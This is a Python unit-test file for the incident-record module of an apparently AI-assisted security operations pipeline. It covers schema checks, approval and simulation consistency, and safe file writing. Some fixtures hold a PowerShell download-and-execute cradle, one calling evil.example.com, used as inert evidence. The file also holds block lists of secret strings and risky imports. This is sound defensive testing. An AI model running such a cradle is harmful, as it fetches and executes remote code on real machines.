"""Unit and integration tests for Milestone 5A Incident Record module.

Verifies:
1. Schema validation, bounds, and immutability for IncidentRecord.
2. Cross-object consistency verification (incident ID, proposed actions, approval state, simulation state).
3. Fail-closed behavior on contradictory facts.
4. IncidentJsonWriter path safety, atomic replacement, directory creation, overwrite protection, and sanitization.
5. Security boundary enforcement (zero subprocess, socket, network, or raw secrets).
6. Full pipeline integration fixtures (benign NO_ACTION, critical approved SIMULATED, critical denied NOT_EXECUTED).
"""

from dataclasses import FrozenInstanceError
import json
import os
from pathlib import Path
import tempfile
import threading
import unittest
from unittest.mock import patch

from investigator.approval import (
    ApprovalDecision,
    ApprovalReasonCode,
    ApprovalRecord,
    DEFAULT_APPROVER,
)
from investigator.incident_record import (
    DEFAULT_INCIDENTS_DIR,
    SCHEMA_VERSION,
    IncidentApprovalStatus,
    IncidentConsistencyError,
    IncidentFileExistsError,
    IncidentJsonWriter,
    IncidentPathError,
    IncidentRecord,
    IncidentRecordError,
    IncidentWriteError,
    build_incident_record,
)
from investigator.policy import (
    BENIGN_LAB_DETECTION_ID,
    ActionDisposition,
    PolicyDecision,
    ProposedAction,
    RiskLevel,
)
from investigator.schemas import (
    InvestigationInput,
    InvestigationResult,
)
from investigator.simulator import (
    SimulationResult,
    SimulationStatus,
)


class TestIncidentRecordSchema(unittest.TestCase):
    """Verify IncidentRecord schema validation, types, and bounds."""

    def setUp(self) -> None:
        self.valid_benign_dict = {
            "schema_version": SCHEMA_VERSION,
            "incident_id": "INC-TEST-001",
            "created_at_utc": "2026-09-18T20:00:00+00:00",
            "detection_id": BENIGN_LAB_DETECTION_ID,
            "detection_name": "suspicious encoded powershell execution",
            "target_host": "DC01",
            "target_user": "SYSTEM",
            "evidence_source": "Live Splunk (localhost:8089)",
            "decoded_command": "Write-Host 'AI-NativeSOC-LAB-TEST'",
            "mitre_technique_id": "T1059.001",
            "investigation_summary": "Controlled benign lab administrative test script executed on DC01.",
            "confidence_level": "high",
            "suspicious_indicator_count": 0,
            "recommended_next_step": "No further action needed; benign verification confirmed.",
            "risk_score": 0,
            "risk_level": "LOW",
            "disposition": "NO_ACTION",
            "proposed_action": "no_action",
            "requires_human_approval": False,
            "policy_reason_codes": ("benign_lab_fixture_matched",),
            "approval_status": "NOT_REQUIRED",
            "approval_reason_code": None,
            "simulation_status": "NOT_EXECUTED",
            "simulation_detail_code": "simulation_not_required",
        }

    def test_valid_benign_record(self) -> None:
        """A properly populated benign record validates without error."""
        record = IncidentRecord(**self.valid_benign_dict)
        self.assertEqual(record.schema_version, SCHEMA_VERSION)
        self.assertEqual(record.risk_score, 0)
        self.assertEqual(record.approval_status, "NOT_REQUIRED")
        self.assertEqual(record.simulation_status, "NOT_EXECUTED")
        self.assertIsNone(record.approval_reason_code)

    def test_record_immutability(self) -> None:
        """IncidentRecord is frozen and raises FrozenInstanceError on attribute mutation."""
        record = IncidentRecord(**self.valid_benign_dict)
        with self.assertRaises(FrozenInstanceError):
            record.risk_score = 99  # type: ignore

    def test_oversized_strings_rejected(self) -> None:
        """Fields exceeding maximum lengths raise IncidentRecordError."""
        bad = dict(self.valid_benign_dict)
        bad["incident_id"] = "A" * 65  # Limit is 64
        with self.assertRaises(IncidentRecordError):
            IncidentRecord(**bad)

        bad = dict(self.valid_benign_dict)
        bad["investigation_summary"] = "A" * 2001  # Limit is 2000
        with self.assertRaises(IncidentRecordError):
            IncidentRecord(**bad)

        bad = dict(self.valid_benign_dict)
        bad["recommended_next_step"] = "A" * 501  # Limit is 500
        with self.assertRaises(IncidentRecordError):
            IncidentRecord(**bad)

    def test_invalid_types_rejected(self) -> None:
        """Bool passed as integer, or non-string passed where string expected raises IncidentRecordError."""
        bad = dict(self.valid_benign_dict)
        bad["risk_score"] = True  # bool is not accepted as int
        with self.assertRaises(IncidentRecordError):
            IncidentRecord(**bad)

        bad = dict(self.valid_benign_dict)
        bad["suspicious_indicator_count"] = False
        with self.assertRaises(IncidentRecordError):
            IncidentRecord(**bad)

        bad = dict(self.valid_benign_dict)
        bad["requires_human_approval"] = "True"  # str is not accepted as bool
        with self.assertRaises(IncidentRecordError):
            IncidentRecord(**bad)

    def test_invalid_enums_rejected(self) -> None:
        """Unknown enum values raise IncidentRecordError."""
        bad = dict(self.valid_benign_dict)
        bad["confidence_level"] = "ultra-high"
        with self.assertRaises(IncidentRecordError):
            IncidentRecord(**bad)

        bad = dict(self.valid_benign_dict)
        bad["risk_level"] = "SUPER_CRITICAL"
        with self.assertRaises(IncidentRecordError):
            IncidentRecord(**bad)

        bad = dict(self.valid_benign_dict)
        bad["approval_status"] = "MAYBE"
        with self.assertRaises(IncidentRecordError):
            IncidentRecord(**bad)

        bad = dict(self.valid_benign_dict)
        bad["simulation_status"] = "EXECUTED_FOR_REAL"
        with self.assertRaises(IncidentRecordError):
            IncidentRecord(**bad)

    def test_unsafe_incident_id_characters_rejected(self) -> None:
        """Path traversal characters, spaces, and non-ASCII characters are rejected in incident_id."""
        for unsafe_id in ("../INC-001", "INC/001", "INC\\001", "INC 001", "INC;001", "INC\x00"):
            bad = dict(self.valid_benign_dict)
            bad["incident_id"] = unsafe_id
            with self.assertRaises(IncidentRecordError):
                IncidentRecord(**bad)

    def test_policy_reasons_allowlist_enforced(self) -> None:
        """Policy reasons must come strictly from POLICY_REASON_CODES."""
        bad = dict(self.valid_benign_dict)
        bad["policy_reason_codes"] = ("unapproved_model_reason_string",)
        with self.assertRaises(IncidentRecordError):
            IncidentRecord(**bad)

    def test_created_at_utc_valid_z(self) -> None:
        """Timestamp ending in Z parses as valid zero UTC offset."""
        d = dict(self.valid_benign_dict)
        d["created_at_utc"] = "2026-09-18T20:00:00Z"
        rec = IncidentRecord(**d)
        self.assertEqual(rec.created_at_utc, "2026-09-18T20:00:00Z")

    def test_created_at_utc_valid_plus_zero(self) -> None:
        """Timestamp ending in +00:00 parses as valid zero UTC offset."""
        d = dict(self.valid_benign_dict)
        d["created_at_utc"] = "2026-09-18T20:00:00+00:00"
        rec = IncidentRecord(**d)
        self.assertEqual(rec.created_at_utc, "2026-09-18T20:00:00+00:00")

    def test_created_at_utc_invalid_non_zero_offset(self) -> None:
        """Timestamp with non-zero offset like +05:00 is rejected."""
        d = dict(self.valid_benign_dict)
        d["created_at_utc"] = "2026-09-18T20:00:00+05:00"
        with self.assertRaises(IncidentRecordError) as ctx:
            IncidentRecord(**d)
        self.assertIn("UTC offset of exactly zero", str(ctx.exception))

    def test_created_at_utc_invalid_naive(self) -> None:
        """Naive timestamp without timezone is rejected."""
        d = dict(self.valid_benign_dict)
        d["created_at_utc"] = "2026-09-18T20:00:00"
        with self.assertRaises(IncidentRecordError) as ctx:
            IncidentRecord(**d)
        self.assertIn("timezone-aware", str(ctx.exception))

    def test_decoded_command_accepts_inert_url_evidence(self) -> None:
        """decoded_command may contain URL text as inert evidence with zero execution authority."""
        d = dict(self.valid_benign_dict)
        d["decoded_command"] = "IEX (New-Object Net.WebClient).DownloadString('https://evil.example.com/a.ps1')"
        rec = IncidentRecord(**d)
        self.assertEqual(rec.decoded_command, "IEX (New-Object Net.WebClient).DownloadString('https://evil.example.com/a.ps1')")


class TestIncidentConsistencyBuilder(unittest.TestCase):
    """Verify build_incident_record cross-object consistency checks and fail-closed behavior."""

    def setUp(self) -> None:
        self.input_benign = InvestigationInput(
            incident_id="INC-BENIGN-001",
            timestamp="2026-09-18T12:00:00Z",
            host="DC01",
            user="SYSTEM",
            image="powershell.exe",
            command_line="powershell.exe -enc dGVzdA==",
            parent_image="cmd.exe",
            parent_command_line="cmd.exe",
            detection_name="suspicious encoded powershell execution",
            detection_id=BENIGN_LAB_DETECTION_ID,
        )
        self.result_benign = InvestigationResult(
            summary="Benign test command detected.",
            observations=("Observation 1",),
            decoded_command="Write-Host 'AI-NativeSOC-LAB-TEST'",
            mitre_techniques=("T1059.001",),
            suspicious_indicators=(),
            recommended_next_step="No action required.",
            confidence_level="high",
            evidence_refs=("INC-BENIGN-001",),
        )
        self.policy_benign = PolicyDecision(
            risk_score=0,
            risk_level=RiskLevel.LOW,
            action_disposition=ActionDisposition.NO_ACTION,
            proposed_action=ProposedAction.NO_ACTION,
            reasons=("benign_lab_fixture_matched",),
            requires_human_approval=False,
        )
        self.simulation_benign = SimulationResult(
            incident_id="INC-BENIGN-001",
            proposed_action=ProposedAction.NO_ACTION,
            status=SimulationStatus.NOT_EXECUTED,
            detail_code="simulation_not_required",
        )

        # Critical setup
        self.input_critical = InvestigationInput(
            incident_id="INC-CRITICAL-001",
            timestamp="2026-09-18T14:00:00Z",
            host="DC01",
            user="SYSTEM",
            image="powershell.exe",
            command_line="powershell.exe -enc bad==",
            parent_image="cmd.exe",
            parent_command_line="cmd.exe",
            detection_name="suspicious encoded powershell execution",
            detection_id=BENIGN_LAB_DETECTION_ID,
        )
        self.result_critical = InvestigationResult(
            summary="Suspicious download cradle detected.",
            observations=("Observation 1",),
            decoded_command="IEX (New-Object Net.WebClient).DownloadString('http://example.com/s')",
            mitre_techniques=("T1059.001",),
            suspicious_indicators=("download_cradle", "untrusted_network_fetch"),
            recommended_next_step="Isolate DC01 immediately.",
            confidence_level="high",
            evidence_refs=("INC-CRITICAL-001",),
        )
        self.policy_critical = PolicyDecision(
            risk_score=80,
            risk_level=RiskLevel.CRITICAL,
            action_disposition=ActionDisposition.APPROVAL_REQUIRED,
            proposed_action=ProposedAction.SIMULATE_ENDPOINT_ISOLATION,
            reasons=(
                "encoded_powershell_detected",
                "decoded_command_present",
                "mitre_t1059_001",
                "suspicious_indicators_present",
                "multiple_suspicious_indicators",
                "model_confidence_high",
                "approval_required_for_consequential_action",
            ),
            requires_human_approval=True,
        )
        self.approval_approved = ApprovalRecord(
            incident_id="INC-CRITICAL-001",
            proposed_action=ProposedAction.SIMULATE_ENDPOINT_ISOLATION,
            decision=ApprovalDecision.APPROVED,
            approver=DEFAULT_APPROVER,
            reason_code=ApprovalReasonCode.APPROVAL_GRANTED.value,
        )
        self.approval_denied = ApprovalRecord(
            incident_id="INC-CRITICAL-001",
            proposed_action=ProposedAction.SIMULATE_ENDPOINT_ISOLATION,
            decision=ApprovalDecision.DENIED,
            approver=DEFAULT_APPROVER,
            reason_code=ApprovalReasonCode.APPROVAL_DENIED.value,
        )
        self.simulation_simulated = SimulationResult(
            incident_id="INC-CRITICAL-001",
            proposed_action=ProposedAction.SIMULATE_ENDPOINT_ISOLATION,
            status=SimulationStatus.SIMULATED,
            detail_code="simulated_endpoint_isolation",
        )
        self.simulation_blocked = SimulationResult(
            incident_id="INC-CRITICAL-001",
            proposed_action=ProposedAction.SIMULATE_ENDPOINT_ISOLATION,
            status=SimulationStatus.NOT_EXECUTED,
            detail_code="simulation_blocked_denied",
        )

    def test_build_benign_record_success(self) -> None:
        """Valid benign inputs build a clean IncidentRecord with NOT_REQUIRED approval status."""
        record = build_incident_record(
            investigation_input=self.input_benign,
            investigation_result=self.result_benign,
            policy_decision=self.policy_benign,
            simulation_result=self.simulation_benign,
            approval_record=None,
            evidence_source="Live Splunk (localhost:8089)",
            deterministic_decoded_command="Write-Host 'AI-NativeSOC-LAB-TEST'",
            mitre_technique_id="T1059.001",
        )
        self.assertEqual(record.incident_id, "INC-BENIGN-001")
        self.assertEqual(record.risk_score, 0)
        self.assertEqual(record.risk_level, "LOW")
        self.assertEqual(record.approval_status, IncidentApprovalStatus.NOT_REQUIRED.value)
        self.assertIsNone(record.approval_reason_code)
        self.assertEqual(record.simulation_status, "NOT_EXECUTED")
        self.assertEqual(record.simulation_detail_code, "simulation_not_required")

    def test_build_critical_approved_record_success(self) -> None:
        """Valid critical approved inputs build an IncidentRecord with APPROVED and SIMULATED status."""
        record = build_incident_record(
            investigation_input=self.input_critical,
            investigation_result=self.result_critical,
            policy_decision=self.policy_critical,
            simulation_result=self.simulation_simulated,
            approval_record=self.approval_approved,
            evidence_source="Sanitized Local Synthetic Fixture",
            deterministic_decoded_command="IEX (New-Object Net.WebClient).DownloadString('http://example.com/s')",
            mitre_technique_id="T1059.001",
        )
        self.assertEqual(record.incident_id, "INC-CRITICAL-001")
        self.assertEqual(record.risk_score, 80)
        self.assertEqual(record.risk_level, "CRITICAL")
        self.assertEqual(record.approval_status, IncidentApprovalStatus.APPROVED.value)
        self.assertEqual(record.approval_reason_code, "approval_granted")
        self.assertEqual(record.simulation_status, "SIMULATED")
        self.assertEqual(record.simulation_detail_code, "simulated_endpoint_isolation")

    def test_build_critical_denied_record_success(self) -> None:
        """Valid critical denied inputs build an IncidentRecord with DENIED and NOT_EXECUTED status."""
        record = build_incident_record(
            investigation_input=self.input_critical,
            investigation_result=self.result_critical,
            policy_decision=self.policy_critical,
            simulation_result=self.simulation_blocked,
            approval_record=self.approval_denied,
            evidence_source="Sanitized Local Synthetic Fixture",
            deterministic_decoded_command="IEX (New-Object Net.WebClient).DownloadString('http://example.com/s')",
            mitre_technique_id="T1059.001",
        )
        self.assertEqual(record.incident_id, "INC-CRITICAL-001")
        self.assertEqual(record.approval_status, IncidentApprovalStatus.DENIED.value)
        self.assertEqual(record.approval_reason_code, "approval_denied")
        self.assertEqual(record.simulation_status, "NOT_EXECUTED")
        self.assertEqual(record.simulation_detail_code, "simulation_blocked_denied")

    def test_incident_id_mismatch_fails_closed(self) -> None:
        """Simulation result with a mismatched incident ID raises IncidentConsistencyError."""
        mismatched_sim = SimulationResult(
            incident_id="INC-OTHER-999",
            proposed_action=ProposedAction.NO_ACTION,
            status=SimulationStatus.NOT_EXECUTED,
            detail_code="simulation_not_required",
        )
        with self.assertRaises(IncidentConsistencyError):
            build_incident_record(
                investigation_input=self.input_benign,
                investigation_result=self.result_benign,
                policy_decision=self.policy_benign,
                simulation_result=mismatched_sim,
                approval_record=None,
            )

    def test_approval_incident_id_mismatch_fails_closed(self) -> None:
        """Approval record with a mismatched incident ID raises IncidentConsistencyError."""
        mismatched_approval = ApprovalRecord(
            incident_id="INC-OTHER-999",
            proposed_action=ProposedAction.SIMULATE_ENDPOINT_ISOLATION,
            decision=ApprovalDecision.APPROVED,
            approver=DEFAULT_APPROVER,
            reason_code=ApprovalReasonCode.APPROVAL_GRANTED.value,
        )
        with self.assertRaises(IncidentConsistencyError):
            build_incident_record(
                investigation_input=self.input_critical,
                investigation_result=self.result_critical,
                policy_decision=self.policy_critical,
                simulation_result=self.simulation_simulated,
                approval_record=mismatched_approval,
            )

    def test_proposed_action_mismatch_fails_closed(self) -> None:
        """Simulation result with different proposed action raises IncidentConsistencyError."""
        mismatched_sim = SimulationResult(
            incident_id="INC-BENIGN-001",
            proposed_action=ProposedAction.MONITOR,
            status=SimulationStatus.NOT_EXECUTED,
            detail_code="simulation_not_required",
        )
        with self.assertRaises(IncidentConsistencyError):
            build_incident_record(
                investigation_input=self.input_benign,
                investigation_result=self.result_benign,
                policy_decision=self.policy_benign,
                simulation_result=mismatched_sim,
            )

    def test_consequential_action_missing_approval_record_fails_closed(self) -> None:
        """Critical action requiring approval fails closed if approval_record is None."""
        with self.assertRaises(IncidentConsistencyError):
            build_incident_record(
                investigation_input=self.input_critical,
                investigation_result=self.result_critical,
                policy_decision=self.policy_critical,
                simulation_result=self.simulation_simulated,
                approval_record=None,
            )

    def test_benign_action_cannot_accept_approval_record(self) -> None:
        """Benign action that did not require approval raises IncidentConsistencyError if approval_record is given."""
        with self.assertRaises(IncidentConsistencyError):
            build_incident_record(
                investigation_input=self.input_benign,
                investigation_result=self.result_benign,
                policy_decision=self.policy_benign,
                simulation_result=self.simulation_benign,
                approval_record=self.approval_approved,
            )

    def test_approved_action_with_not_executed_simulation_fails_closed(self) -> None:
        """Approved consequential action cannot claim NOT_EXECUTED when inconsistent."""
        with self.assertRaises(IncidentConsistencyError):
            build_incident_record(
                investigation_input=self.input_critical,
                investigation_result=self.result_critical,
                policy_decision=self.policy_critical,
                simulation_result=self.simulation_blocked,  # NOT_EXECUTED
                approval_record=self.approval_approved,     # APPROVED
            )

    def test_denied_action_with_simulated_outcome_fails_closed(self) -> None:
        """Denied approval record cannot result in SIMULATED status."""
        with self.assertRaises(IncidentConsistencyError):
            build_incident_record(
                investigation_input=self.input_critical,
                investigation_result=self.result_critical,
                policy_decision=self.policy_critical,
                simulation_result=self.simulation_simulated,  # SIMULATED
                approval_record=self.approval_denied,         # DENIED
            )

    def test_approved_simulated_with_wrong_detail_code_fails_closed(self) -> None:
        """Approved + SIMULATED + simulation_not_required fails closed."""
        wrong_sim = SimulationResult(
            incident_id="INC-CRITICAL-001",
            proposed_action=ProposedAction.SIMULATE_ENDPOINT_ISOLATION,
            status=SimulationStatus.SIMULATED,
            detail_code="simulation_not_required",
        )
        with self.assertRaises(IncidentConsistencyError):
            build_incident_record(
                investigation_input=self.input_critical,
                investigation_result=self.result_critical,
                policy_decision=self.policy_critical,
                simulation_result=wrong_sim,
                approval_record=self.approval_approved,
            )

    def test_denied_not_executed_with_wrong_detail_code_fails_closed(self) -> None:
        """Denied + NOT_EXECUTED + simulation_not_required fails closed."""
        wrong_sim = SimulationResult(
            incident_id="INC-CRITICAL-001",
            proposed_action=ProposedAction.SIMULATE_ENDPOINT_ISOLATION,
            status=SimulationStatus.NOT_EXECUTED,
            detail_code="simulation_not_required",
        )
        with self.assertRaises(IncidentConsistencyError):
            build_incident_record(
                investigation_input=self.input_critical,
                investigation_result=self.result_critical,
                policy_decision=self.policy_critical,
                simulation_result=wrong_sim,
                approval_record=self.approval_denied,
            )

    def test_no_action_not_executed_with_wrong_detail_code_fails_closed(self) -> None:
        """NO_ACTION + NOT_EXECUTED + human_review_required fails closed."""
        wrong_sim = SimulationResult(
            incident_id="INC-BENIGN-001",
            proposed_action=ProposedAction.NO_ACTION,
            status=SimulationStatus.NOT_EXECUTED,
            detail_code="human_review_required",
        )
        with self.assertRaises(IncidentConsistencyError):
            build_incident_record(
                investigation_input=self.input_benign,
                investigation_result=self.result_benign,
                policy_decision=self.policy_benign,
                simulation_result=wrong_sim,
                approval_record=None,
            )

    def test_request_human_review_not_executed_with_wrong_detail_code_fails_closed(self) -> None:
        """REQUEST_HUMAN_REVIEW + NOT_EXECUTED + simulation_not_required fails closed."""
        policy_review = PolicyDecision(
            risk_score=50,
            risk_level=RiskLevel.MEDIUM,
            action_disposition=ActionDisposition.HUMAN_REVIEW,
            proposed_action=ProposedAction.REQUEST_HUMAN_REVIEW,
            reasons=("suspicious_indicators_present",),
            requires_human_approval=False,
        )
        wrong_sim = SimulationResult(
            incident_id="INC-BENIGN-001",
            proposed_action=ProposedAction.REQUEST_HUMAN_REVIEW,
            status=SimulationStatus.NOT_EXECUTED,
            detail_code="simulation_not_required",
        )
        with self.assertRaises(IncidentConsistencyError):
            build_incident_record(
                investigation_input=self.input_benign,
                investigation_result=self.result_benign,
                policy_decision=policy_review,
                simulation_result=wrong_sim,
                approval_record=None,
            )

    def test_valid_all_action_status_detail_combinations_pass(self) -> None:
        """All valid non-consequential combinations pass deterministic consistency checks."""
        # 1. MONITOR -> NOT_EXECUTED + simulation_not_required
        policy_monitor = PolicyDecision(
            risk_score=25,
            risk_level=RiskLevel.LOW,
            action_disposition=ActionDisposition.MONITOR,
            proposed_action=ProposedAction.MONITOR,
            reasons=("encoded_powershell_detected",),
            requires_human_approval=False,
        )
        sim_monitor = SimulationResult(
            incident_id="INC-BENIGN-001",
            proposed_action=ProposedAction.MONITOR,
            status=SimulationStatus.NOT_EXECUTED,
            detail_code="simulation_not_required",
        )
        rec_monitor = build_incident_record(
            investigation_input=self.input_benign,
            investigation_result=self.result_benign,
            policy_decision=policy_monitor,
            simulation_result=sim_monitor,
            approval_record=None,
        )
        self.assertEqual(rec_monitor.simulation_detail_code, "simulation_not_required")

        # 2. REQUEST_HUMAN_REVIEW -> NOT_EXECUTED + human_review_required
        policy_review = PolicyDecision(
            risk_score=50,
            risk_level=RiskLevel.MEDIUM,
            action_disposition=ActionDisposition.HUMAN_REVIEW,
            proposed_action=ProposedAction.REQUEST_HUMAN_REVIEW,
            reasons=("suspicious_indicators_present",),
            requires_human_approval=False,
        )
        sim_review = SimulationResult(
            incident_id="INC-BENIGN-001",
            proposed_action=ProposedAction.REQUEST_HUMAN_REVIEW,
            status=SimulationStatus.NOT_EXECUTED,
            detail_code="human_review_required",
        )
        rec_review = build_incident_record(
            investigation_input=self.input_benign,
            investigation_result=self.result_benign,
            policy_decision=policy_review,
            simulation_result=sim_review,
            approval_record=None,
        )
        self.assertEqual(rec_review.simulation_detail_code, "human_review_required")

        # 3. CREATE_INCIDENT_RECORD -> NOT_EXECUTED + incident_record_deferred
        policy_incident = PolicyDecision(
            risk_score=65,
            risk_level=RiskLevel.HIGH,
            action_disposition=ActionDisposition.MONITOR,
            proposed_action=ProposedAction.CREATE_INCIDENT_RECORD,
            reasons=("multiple_suspicious_indicators",),
            requires_human_approval=False,
        )
        sim_incident = SimulationResult(
            incident_id="INC-BENIGN-001",
            proposed_action=ProposedAction.CREATE_INCIDENT_RECORD,
            status=SimulationStatus.NOT_EXECUTED,
            detail_code="incident_record_deferred",
        )
        rec_incident = build_incident_record(
            investigation_input=self.input_benign,
            investigation_result=self.result_benign,
            policy_decision=policy_incident,
            simulation_result=sim_incident,
            approval_record=None,
        )
        self.assertEqual(rec_incident.simulation_detail_code, "incident_record_deferred")



class TestIncidentJsonWriter(unittest.TestCase):
    """Verify IncidentJsonWriter file operations, path safety, and atomic behavior."""

    def setUp(self) -> None:
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.writer = IncidentJsonWriter(self.tmp_dir.name)
        self.record = IncidentRecord(
            schema_version=SCHEMA_VERSION,
            incident_id="INC-UNIT-2026-001",
            created_at_utc="2026-09-18T20:00:00+00:00",
            detection_id=BENIGN_LAB_DETECTION_ID,
            detection_name="suspicious encoded powershell execution",
            target_host="DC01",
            target_user="SYSTEM",
            evidence_source="Live Splunk (localhost:8089)",
            decoded_command="Write-Host 'AI-NativeSOC-LAB-TEST'",
            mitre_technique_id="T1059.001",
            investigation_summary="Summary of incident.",
            confidence_level="high",
            suspicious_indicator_count=0,
            recommended_next_step="No action.",
            risk_score=0,
            risk_level="LOW",
            disposition="NO_ACTION",
            proposed_action="no_action",
            requires_human_approval=False,
            policy_reason_codes=("benign_lab_fixture_matched",),
            approval_status="NOT_REQUIRED",
            approval_reason_code=None,
            simulation_status="NOT_EXECUTED",
            simulation_detail_code="simulation_not_required",
        )

    def tearDown(self) -> None:
        self.tmp_dir.cleanup()

    def test_write_record_success(self) -> None:
        """Writes valid deterministic JSON with allowlisted keys to <incident_id>.json."""
        out_path = self.writer.write_record(self.record)
        self.assertTrue(out_path.exists())
        self.assertEqual(out_path.name, "INC-UNIT-2026-001.json")

        content = json.loads(out_path.read_text(encoding="utf-8"))
        self.assertEqual(content["incident_id"], "INC-UNIT-2026-001")
        self.assertEqual(content["schema_version"], SCHEMA_VERSION)
        self.assertEqual(content["risk_score"], 0)
        self.assertEqual(len(content), 24)

    def test_overwrite_protection(self) -> None:
        """Attempting to write an existing incident without overwrite=True raises IncidentFileExistsError."""
        self.writer.write_record(self.record)
        with self.assertRaises(IncidentFileExistsError):
            self.writer.write_record(self.record, overwrite=False)

    def test_concurrent_writes_do_not_overwrite(self) -> None:
        """Concurrent writes without overwrite=True result in exactly one success and no clobbered file."""
        successes = []
        errors = []

        def worker() -> None:
            try:
                self.writer.write_record(self.record, overwrite=False)
                successes.append(True)
            except IncidentFileExistsError as exc:
                errors.append(exc)

        threads = [threading.Thread(target=worker) for _ in range(8)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(len(successes), 1)
        self.assertEqual(len(errors), 7)

        target = Path(self.tmp_dir.name) / f"{self.record.incident_id}.json"
        self.assertTrue(target.exists())
        content = json.loads(target.read_text(encoding="utf-8"))
        self.assertEqual(content["incident_id"], self.record.incident_id)

    def test_unsupported_linking_fails_closed_without_fallback(self) -> None:
        """When os.link raises unsupported OSError, writer fails closed and destination is not created/replaced."""
        target_path = Path(self.tmp_dir.name) / f"{self.record.incident_id}.json"
        self.assertFalse(target_path.exists())

        # When destination is absent, unsupported link fails closed and does NOT create destination file
        with patch("os.link", side_effect=OSError("Hard links unsupported")):
            with self.assertRaises(IncidentWriteError) as ctx:
                self.writer.write_record(self.record, overwrite=False)
            self.assertIn("incident_write_failed_linking_unavailable", str(ctx.exception))

        self.assertFalse(target_path.exists())

        # When destination already exists, fast-path check prevents overwrite attempt
        target_path.write_text('{"sentinel": "untouched"}', encoding="utf-8")
        with patch("os.link", side_effect=OSError("Hard links unsupported")):
            with self.assertRaises(IncidentFileExistsError):
                self.writer.write_record(self.record, overwrite=False)

        # Content must remain completely untouched (no fallback to os.replace occurred)
        self.assertEqual(target_path.read_text(encoding="utf-8"), '{"sentinel": "untouched"}')

    def test_overwrite_allowed_when_flagged(self) -> None:
        """Writing with overwrite=True successfully replaces the file."""
        self.writer.write_record(self.record)
        out_path = self.writer.write_record(self.record, overwrite=True)
        self.assertTrue(out_path.exists())

    def test_directory_created_if_absent(self) -> None:
        """Nested missing directory is created automatically on write."""
        sub_dir = Path(self.tmp_dir.name) / "deep" / "nested" / "incidents"
        nested_writer = IncidentJsonWriter(sub_dir)
        out_path = nested_writer.write_record(self.record)
        self.assertTrue(out_path.exists())

    def test_path_traversal_incident_id_rejected(self) -> None:
        """Path traversal incident IDs raise IncidentPathError."""
        # Test constructor rejecting file path as dir
        test_file = Path(self.tmp_dir.name) / "file.txt"
        test_file.write_text("hello", encoding="utf-8")
        with self.assertRaises(IncidentPathError):
            IncidentJsonWriter(test_file)

    def test_no_secrets_in_json(self) -> None:
        """Incident JSON never contains API keys, environment variables, or raw payloads."""
        out_path = self.writer.write_record(self.record)
        raw_text = out_path.read_text(encoding="utf-8")
        for forbidden in ("sk-", "OPENAI_API_KEY", "<Event xmlns", "\"messages\":"):
            self.assertNotIn(forbidden, raw_text)


class TestIncidentRecordSecurityBoundaries(unittest.TestCase):
    """Verify security isolation of the incident_record module."""

    def test_no_subprocess_or_network_imported(self) -> None:
        """incident_record module must not import subprocess, sockets, or network libraries."""
        import investigator.incident_record as mod
        src = Path(mod.__file__).read_text(encoding="utf-8")
        self.assertNotIn("import subprocess", src)
        self.assertNotIn("from subprocess import", src)
        self.assertNotIn("os.system", src)
        self.assertNotIn("import socket", src)
        self.assertNotIn("from socket import", src)
        self.assertNotIn("import urllib", src)
        self.assertNotIn("import requests", src)
        self.assertNotIn("import openai", src)
        self.assertNotIn("eval(", src)
        self.assertNotIn("exec(", src)


if __name__ == "__main__":
    unittest.main()
